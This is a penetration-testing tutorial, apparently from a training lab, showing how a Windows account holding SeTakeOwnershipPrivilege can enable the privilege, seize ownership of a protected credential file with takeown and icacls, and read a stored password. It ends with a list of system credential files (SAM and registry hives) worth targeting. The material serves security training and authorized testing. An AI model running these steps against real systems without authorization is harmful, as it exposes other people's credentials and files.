# SeTakeOwnershipPrivlege Exploitation

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE\_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.

Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights.

The setting can be set in Group Policy under:

`Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

## Example

### **Reviewing Current User Privileges**

Let's review our current user's privileges.

```powershell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### **Enabling SeTakeOwnershipPrivilege**

Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell
PS C:\> Import-Module .\Enable-Privilege.ps1
PS C:\> .\EnableAllTokenPrivs.ps1
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

### **Choosing a Target File**

Next, we choose a target file and confirm the current ownership. It is common to encounter file shares with `Public` and `Private` directories with subdirectories set up by department. Given a user's role in the company, they can often access specific files/directories. Even with a structure like this, a sysadmin may misconfigure permissions on directories and subdirectories, making file shares a rich source of information for us once we have obtained Active Directory credentials (and sometimes even without needing credentials).

Given that our user account has `SeTakeOwnershipPrivilege` (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.

{% hint style="danger" %}
#### Changing Permissions

Take care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.
{% endhint %}

Let's check out our target file to gather a bit more information about it.

```powershell
PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

### **Checking File Ownership**

We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.

```powershell
PS C:\> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

We can see that the IT share appears to be owned by a service account and does contain a file `cred.txt` with some data inside it.

### **Taking Ownership of the File**

Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell
PS C:\> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### **Confirming Ownership Changed**

We can confirm ownership using the same command as before. We now see that our user account is the file owner.

```powershell
PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### **Modifying the File ACL**

We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell
PS C:\> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Let's grant our user full privileges over the target file.

```powershell
PS C:\> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### **Reading the File**

If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database).

```powershell
PS C:\> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!
```

After performing these changes, we would want to make every effort to revert the permissions/file ownership. If we cannot for some reason, we should alert our client and carefully document the modifications in an appendix of our report deliverable. _**Again, leveraging this permission can be considered a destructive action and should be done with great care.**_ Some clients may prefer that we document the ability to perform the action as evidence of a misconfiguration but not fully take advantage of the flaw due to the potential impact.

## **Files of Interest**

Some local files of interest may include:

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
